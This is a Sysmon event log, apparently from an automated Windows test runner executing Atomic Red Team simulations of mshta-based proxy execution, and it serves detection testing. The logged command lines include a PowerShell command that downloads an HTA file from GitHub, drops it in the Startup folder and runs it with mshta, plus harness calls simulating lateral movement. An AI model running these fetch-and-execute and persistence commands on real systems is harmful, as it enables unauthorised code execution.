CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:25.988
ProcessGuid: {f995aebf-6409-6942-9906-000000000e00}
ProcessId: 5560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1oyt3a2r.wm4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:25.964
ProcessGuid: {f995aebf-6409-6942-9906-000000000e00}
ProcessId: 5560
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1oyt3a2r.wm4.ps1
CreationUtcTime: 2025-12-17 08:04:25.964
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:25 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:25.940
SourceProcessGUID: {f995aebf-6080-6942-d802-000000000e00}
SourceProcessId: 10068
SourceThreadId: 6028
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|C:\Windows\System32\perfts.dll+5d37|C:\Windows\System32\perfts.dll+7cb4|C:\Windows\System32\advapi32.dll+3e990|C:\Windows\System32\advapi32.dll+23e7|C:\Windows\System32\advapi32.dll+1d27|C:\Windows\System32\advapi32.dll+2dd43|C:\Windows\System32\advapi32.dll+2d15b|C:\Windows\System32\KERNELBASE.dll+2db1b|C:\Windows\System32\KERNELBASE.dll+2badb|C:\Windows\SYSTEM32\pdh.dll+61c1|C:\Windows\SYSTEM32\pdh.dll+6056|C:\Windows\SYSTEM32\pdh.dll+5189|C:\Windows\SYSTEM32\pdh.dll+10f37|C:\Windows\SYSTEM32\pdh.dll+108f5|C:\Windows\System32\wbem\WmiPerfClass.dll+c68b|C:\Windows\System32\wbem\WmiPerfClass.dll+d09c|C:\Windows\System32\wbem\WmiPerfClass.dll+8891|C:\Windows\System32\wbem\WmiPerfClass.dll+8680|C:\Windows\System32\wbem\WmiPerfClass.dll+84ca|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:25 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:25.928
SourceProcessGUID: {f995aebf-6080-6942-d802-000000000e00}
SourceProcessId: 10068
SourceThreadId: 6028
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\WINSTA.dll+3532|C:\Windows\System32\WINSTA.dll+3360|C:\Windows\System32\WINSTA.dll+2de9|C:\Windows\SYSTEM32\WTSAPI32.dll+1d83|C:\Windows\System32\perfts.dll+7c86|C:\Windows\System32\advapi32.dll+3e990|C:\Windows\System32\advapi32.dll+23e7|C:\Windows\System32\advapi32.dll+1d27|C:\Windows\System32\advapi32.dll+2dd43|C:\Windows\System32\advapi32.dll+2d15b|C:\Windows\System32\KERNELBASE.dll+2db1b|C:\Windows\System32\KERNELBASE.dll+2badb|C:\Windows\SYSTEM32\pdh.dll+61c1|C:\Windows\SYSTEM32\pdh.dll+6056|C:\Windows\SYSTEM32\pdh.dll+5189|C:\Windows\SYSTEM32\pdh.dll+10f37|C:\Windows\SYSTEM32\pdh.dll+108f5|C:\Windows\System32\wbem\WmiPerfClass.dll+c68b|C:\Windows\System32\wbem\WmiPerfClass.dll+d09c|C:\Windows\System32\wbem\WmiPerfClass.dll+8891|C:\Windows\System32\wbem\WmiPerfClass.dll+8680|C:\Windows\System32\wbem\WmiPerfClass.dll+84ca|C:\Windows\System32\KERNEL32.DLL+2e8d7
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:04:25 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:25.866
ProcessGuid: {f995aebf-6409-6942-9906-000000000e00}
ProcessId: 5560
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:25.359
ProcessGuid: {f995aebf-6409-6942-9706-000000000e00}
ProcessId: 9484
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ne2fa01l.qru.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:25.341
ProcessGuid: {f995aebf-6409-6942-9706-000000000e00}
ProcessId: 9484
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ne2fa01l.qru.ps1
CreationUtcTime: 2025-12-17 08:04:25.341
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:25 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:25.263
ProcessGuid: {f995aebf-6409-6942-9706-000000000e00}
ProcessId: 9484
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:24.789
ProcessGuid: {f995aebf-6408-6942-9506-000000000e00}
ProcessId: 2732
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cndeevgz.chf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:24 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:24.771
ProcessGuid: {f995aebf-6408-6942-9506-000000000e00}
ProcessId: 2732
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cndeevgz.chf.ps1
CreationUtcTime: 2025-12-17 08:04:24.771
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:24.689
ProcessGuid: {f995aebf-6408-6942-9506-000000000e00}
ProcessId: 2732
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:24.222
ProcessGuid: {f995aebf-6408-6942-9306-000000000e00}
ProcessId: 7984
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_c5w4hpgl.gwg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:24 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:24.200
ProcessGuid: {f995aebf-6408-6942-9306-000000000e00}
ProcessId: 7984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_c5w4hpgl.gwg.ps1
CreationUtcTime: 2025-12-17 08:04:24.200
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:24.120
ProcessGuid: {f995aebf-6408-6942-9306-000000000e00}
ProcessId: 7984
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:23.622
ProcessGuid: {f995aebf-6407-6942-9106-000000000e00}
ProcessId: 2620
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bwwoqree.sqm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:23.602
ProcessGuid: {f995aebf-6407-6942-9106-000000000e00}
ProcessId: 2620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bwwoqree.sqm.ps1
CreationUtcTime: 2025-12-17 08:04:23.602
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:23.522
ProcessGuid: {f995aebf-6407-6942-9106-000000000e00}
ProcessId: 2620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:23.044
ProcessGuid: {f995aebf-6406-6942-8f06-000000000e00}
ProcessId: 4964
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bzlcd3i4.sll.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:23.025
ProcessGuid: {f995aebf-6406-6942-8f06-000000000e00}
ProcessId: 4964
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bzlcd3i4.sll.ps1
CreationUtcTime: 2025-12-17 08:04:23.025
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:22.942
ProcessGuid: {f995aebf-6406-6942-8f06-000000000e00}
ProcessId: 4964
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:09 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:04:07.535
ProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ProcessId: 4552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 54789
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:04:08 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:04:07.526
ProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ProcessId: 4552
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:04:05.910
ProcessGuid: {f995aebf-63f5-6942-7a06-000000000e00}
ProcessId: 3036
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\mshta.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:07.822
ProcessGuid: {f995aebf-63f7-6942-8706-000000000e00}
ProcessId: 6948
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" /c calc.exe
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63f7-6942-8606-000000000e00}
ParentProcessId: 9144
ParentImage: C:\Windows\System32\mshta.exe
ParentCommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:07.633
ProcessGuid: {f995aebf-63f7-6942-8606-000000000e00}
ProcessId: 9144
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ParentProcessId: 4552
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:07.625
ProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ProcessId: 4552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta
CreationUtcTime: 2025-12-17 08:04:07.625
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:04:07.580
ProcessGuid: {f995aebf-63f6-6942-8006-000000000e00}
ProcessId: 7564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.254
ProcessGuid: {f995aebf-63f6-6942-8006-000000000e00}
ProcessId: 7564
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qq50berx.nro.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:07.228
ProcessGuid: {f995aebf-63f6-6942-8006-000000000e00}
ProcessId: 7564
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qq50berx.nro.ps1
CreationUtcTime: 2025-12-17 08:04:07.228
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:04:07.228
ProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ProcessId: 4552
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_crpflrga.y2i.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:04:07 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:04:07.193
ProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ProcessId: 4552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_crpflrga.y2i.ps1
CreationUtcTime: 2025-12-17 08:04:07.193
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:07 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:04:07.067
ProcessGuid: {f995aebf-63f7-6942-8406-000000000e00}
ProcessId: 4552
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
